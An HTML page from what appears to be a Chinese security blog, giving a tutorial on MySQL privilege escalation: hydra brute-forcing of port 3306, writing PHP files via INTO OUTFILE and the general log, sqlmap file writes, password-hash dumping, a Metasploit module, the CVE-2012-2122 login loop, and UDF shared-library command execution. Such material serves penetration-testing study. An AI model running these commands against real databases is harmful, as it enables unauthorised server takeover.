@@ -1,0 +1,785 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/gc.jpg">
+  <link rel="icon" href="/img/gc.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fru1ts">
+  <meta name="keywords" content="fru1ts">
+  
+    <meta name="description" content="本文讲使用最高权限登录mysql终端后如何获取shell权限  获取mysql的用户名和密码的方式   MySQL 3306 端口弱口令爆破 1hydra -l 用户名 -P 密码字典 mysql:&#x2F;&#x2F;对方IP   sqlmap 注入的 --sql-shell 模式   网站的数据库配置文件中拿到明文密码信息   CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限    获取webs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql提权">
+<meta property="og:url" content="https://fru1ts.github.io/2024/02/05/mysql%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="fru1ts&#39; Blog">
+<meta property="og:description" content="本文讲使用最高权限登录mysql终端后如何获取shell权限  获取mysql的用户名和密码的方式   MySQL 3306 端口弱口令爆破 1hydra -l 用户名 -P 密码字典 mysql:&#x2F;&#x2F;对方IP   sqlmap 注入的 --sql-shell 模式   网站的数据库配置文件中拿到明文密码信息   CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限    获取webs">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://fru1ts.github.io/2024/02/05/mysql%E6%8F%90%E6%9D%83/1.png">
+<meta property="article:published_time" content="2024-02-05T11:37:58.000Z">
+<meta property="article:modified_time" content="2024-09-27T11:54:39.476Z">
+<meta property="article:author" content="fru1ts">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fru1ts.github.io/2024/02/05/mysql%E6%8F%90%E6%9D%83/1.png">
+  
+  
+  
+  <title>mysql提权 - fru1ts&#39; Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mouse.css">
+<link rel="stylesheet" href="/css/scroll.css">
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fru1ts.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","app_key":"PSBkctB8cKrR97yZLNXnJ0nj","server_url":"https://wedmocok.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.11.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fru1ts&#39; Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="mysql提权"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-05 11:37" pubdate>
+          February 5, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          32 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> views
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">mysql提权</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    Last updated on September 27, 2024 am
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>本文讲使用<strong>最高权限</strong>登录mysql终端后如何获取shell权限</p>
+<h3 id="获取mysql的用户名和密码的方式"><a class="markdownIt-Anchor" href="#获取mysql的用户名和密码的方式"></a> 获取mysql的用户名和密码的方式</h3>
+<ol>
+<li>
+<p>MySQL 3306 端口弱口令爆破</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra -l 用户名 -P 密码字典 mysql:<span class="hljs-regexp">//</span>对方IP<br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>sqlmap 注入的 <code>--sql-shell</code> 模式</p>
+</li>
+<li>
+<p>网站的数据库配置文件中拿到明文密码信息</p>
+</li>
+<li>
+<p>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</p>
+</li>
+</ol>
+<h3 id="获取webshell权限"><a class="markdownIt-Anchor" href="#获取webshell权限"></a> 获取webshell权限</h3>
+<h4 id="into-oufile-写-shell"><a class="markdownIt-Anchor" href="#into-oufile-写-shell"></a> into oufile 写 shell</h4>
+<p>前提：</p>
+<ul>
+<li>secure_file_priv 无限制（才能使用load_file）</li>
+</ul>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="hljs-section">+------------------+-------+</span><br><span class="hljs-section">| Variable_name    | Value |</span><br><span class="hljs-section">+------------------+-------+</span><br><span class="hljs-section">| secure_file_priv |       |</span><br><span class="hljs-section">+------------------+-------+</span><br></code></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th><strong>Value</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NULL</td>
+<td>不允许导入或导出</td>
+</tr>
+<tr>
+<td>/tmp</td>
+<td>只允许在 /tmp 目录导入导出</td>
+</tr>
+<tr>
+<td>空</td>
+<td>不限制目录</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>只能网站文件的物理地址</li>
+<li>网站路径下具有写权限</li>
+</ul>
+<p>利用：</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into outfile &#x27;/var/www/html/info.php&#x27;;</span><br><span class="language-xml">#sqlmap操作</span><br><span class="language-xml">sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot; </span><br></code></pre></td></tr></table></figure>
+<h4 id="日志文件写shell"><a class="markdownIt-Anchor" href="#日志文件写shell"></a> 日志文件写shell</h4>
+<p>要求对网站目录具有写权限</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="hljs-section">+------------------+---------------------------+</span><br><span class="hljs-section">| Variable_name    | Value                     |</span><br><span class="hljs-section">+------------------+---------------------------+</span><br>| general<span class="hljs-emphasis">_log      | OFF                       |</span><br><span class="hljs-emphasis">| general_log_file | /var/lib/mysql/fru1ts.log |</span><br><span class="hljs-emphasis">+------------------+---------------------------+</span><br><span class="hljs-emphasis">general_</span>log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。<br><br># 更改日志文件位置<br>set global general<span class="hljs-emphasis">_log = &quot;ON&quot;;</span><br><span class="hljs-emphasis">set global general_log_</span>file=<span class="hljs-emphasis">&#x27;/var/www/html/info.php&#x27;</span>;<br><br># 往日志里面写入 payload<br>select <span class="hljs-emphasis">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;<br><br>访问就能够getshell<br></code></pre></td></tr></table></figure>
+<p>一般成功率低，在linux系统权限限制比较严格，而且写入成功了，这个文件是mysql创建的，apache访问时会出现HTTP 500的状态码，在windows系统成功率会高一点。</p>
+<h3 id="获取主机权限"><a class="markdownIt-Anchor" href="#获取主机权限"></a> 获取主机权限</h3>
+<p>假设已经拥有mysql的最高权限</p>
+<h4 id="hash-获取与解密"><a class="markdownIt-Anchor" href="#hash-获取与解密"></a> Hash 获取与解密</h4>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"># MySQL &lt;= 5.6 版本<br><span class="hljs-section">mysql&gt; select host, user, password from mysql.user;</span><br><span class="hljs-section">+-----------+------+-------------------------------------------+</span><br><span class="hljs-section">| host      | user | password                                  |</span><br><span class="hljs-section">+-----------+------+-------------------------------------------+</span><br>| localhost | root | <span class="hljs-strong">*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="hljs-strong">| 127.0.0.1 | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="hljs-strong">| ::1       | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="hljs-strong">| %         | root | *</span>81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |<br><span class="hljs-code">+-----------+</span>------<span class="hljs-code">+-------------------------------------------+</span><br><br># MySQL &gt;= 5.7 版本<br><span class="hljs-section">mysql &gt; select host,user,authentication_string from mysql.user;</span><br><span class="hljs-section">+-----------+---------------+-------------------------------------------+</span><br><span class="hljs-section">| host      | user          | authentication_string                     |</span><br><span class="hljs-section">+-----------+---------------+-------------------------------------------+</span><br>| localhost | root          | <span class="hljs-strong">*8232A1298A49F710DBEE0B330C42EEC825D4190A |</span><br><span class="hljs-strong">| localhost | mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="hljs-strong">| localhost | mysql.sys     | *</span>THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |<br><span class="hljs-code">+-----------+</span>---------------<span class="hljs-code">+-------------------------------------------+</span><br></code></pre></td></tr></table></figure>
+<p>用<a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a> 破解一下，或者使用Hashcat 破解</p>
+<h4 id="mysql-cve漏洞"><a class="markdownIt-Anchor" href="#mysql-cve漏洞"></a> mysql CVE漏洞</h4>
+<p>可以借助MSF</p>
+<h5 id="yassl-缓冲区溢出"><a class="markdownIt-Anchor" href="#yassl-缓冲区溢出"></a> yaSSL 缓冲区溢出</h5>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msf6 &gt; use exploit<span class="hljs-regexp">/linux/my</span>sql/mysql_yassl_hello<br></code></pre></td></tr></table></figure>
+<h5 id="cve-2012-2122"><a class="markdownIt-Anchor" href="#cve-2012-2122"></a> CVE-2012-2122</h5>
+<p>知道用户名多次输入错误的密码会有几率可以直接成功登陆进数据库，可以循环 1000 次登陆数据库：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 1 1000`; <span class="hljs-keyword">do</span> mysql -uroot -pwrong -h 127.0.0.1 -P3306 ; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+<h4 id="udf提权"><a class="markdownIt-Anchor" href="#udf提权"></a> UDF提权</h4>
+<h5 id="寻找插件目录"><a class="markdownIt-Anchor" href="#寻找插件目录"></a> 寻找插件目录</h5>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%plugin%&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<h5 id="写入动态链接库"><a class="markdownIt-Anchor" href="#写入动态链接库"></a> 写入动态链接库</h5>
+<p>SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有<strong>字节长度限制</strong>，所以往往 POST 注入才可以执行这种攻击</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">sqlmap -u <span class="hljs-string">&quot;http://localhost:30008/&quot;</span> --data<span class="hljs-operator">=</span><span class="hljs-string">&quot;id=1&quot;</span> --file-write<span class="hljs-operator">=</span><span class="hljs-string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span><br></code></pre></td></tr></table></figure>
+<p>没有注入的话，可以通过select写入文件，不过要求<code>secure_file_priv</code>是空</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 解码十六进制再写入多此一举</span><br>SELECT unhex(&#x27;7f454c<span class="hljs-number">4602</span>...&#x27;) INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;<br></code></pre></td></tr></table></figure>
+<p>十六进制的内容可以参考国光师傅的，<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
+<h5 id="创建自定义函数并调用命令"><a class="markdownIt-Anchor" href="#创建自定义函数并调用命令"></a> 创建自定义函数并调用命令</h5>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func; #查看 mysql 函数里面是否新增了 sys_eval<br></code></pre></td></tr></table></figure>
+<p>然后就可以命令执行了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql &gt; select sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<h4 id="udf-shell"><a class="markdownIt-Anchor" href="#udf-shell"></a> UDF shell</h4>
+<h5 id="usfphp"><a class="markdownIt-Anchor" href="#usfphp"></a> USF.PHP</h5>
+<p>假设目标 MySQL 在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，可以使用网页脚本</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">t00ls USF.PHP</a>一键操作</p>
+<h5 id="navicat-mysql"><a class="markdownIt-Anchor" href="#navicat-mysql"></a> Navicat MySQL</h5>
+<p>目标 MySQL 不允许外连，但是可以上传 PHP 脚本,这个时候可以使用 Navicat 自带的 tunnel 隧道脚本上传到目标网站上,</p>
+<p><a target="_blank" rel="noopener" href="https://sqlsec.lanzoux.com/ibpoGijd6bc">https://sqlsec.lanzoux.com/ibpoGijd6bc</a> 国光提供了官方脚本</p>
+<p>启动ntunnel_mysql.php，连接本地数据库，然后Navicat 连接的时候设置HTTP通道</p>
+<img src="/2024/02/05/mysql%E6%8F%90%E6%9D%83/1.png" srcset="/img/loading.gif" lazyload class="">
+<p>然后主机地址填localhost即可</p>
+<p>之后就可以进行UDF提权了</p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <p class="note note-warning">
+                <strong>本文作者: </strong><a href="/">fru1ts</a> <br>
+                <strong>本文链接: </strong><a href="https://fru1ts.github.io/2024/02/05/mysql%E6%8F%90%E6%9D%83/">https://fru1ts.github.io/2024/02/05/mysql%E6%8F%90%E6%9D%83/</a> <br>
+                <strong>版权声明: </strong>本站均采用BY-SA协议，除特别声明外，转载请注明出处!
+                   </p>
+                   
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/23/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/" title="XML实体注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">XML实体注入</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="python格式化字符串漏洞">
+                        <span class="hidden-mobile">python格式化字符串漏洞</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","appKey":"PSBkctB8cKrR97yZLNXnJ0nj","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        Total number of visits 
+        <span id="leancloud-site-pv"></span>
+         
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        Total number of visitors 
+        <span id="leancloud-site-uv"></span>
+         
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
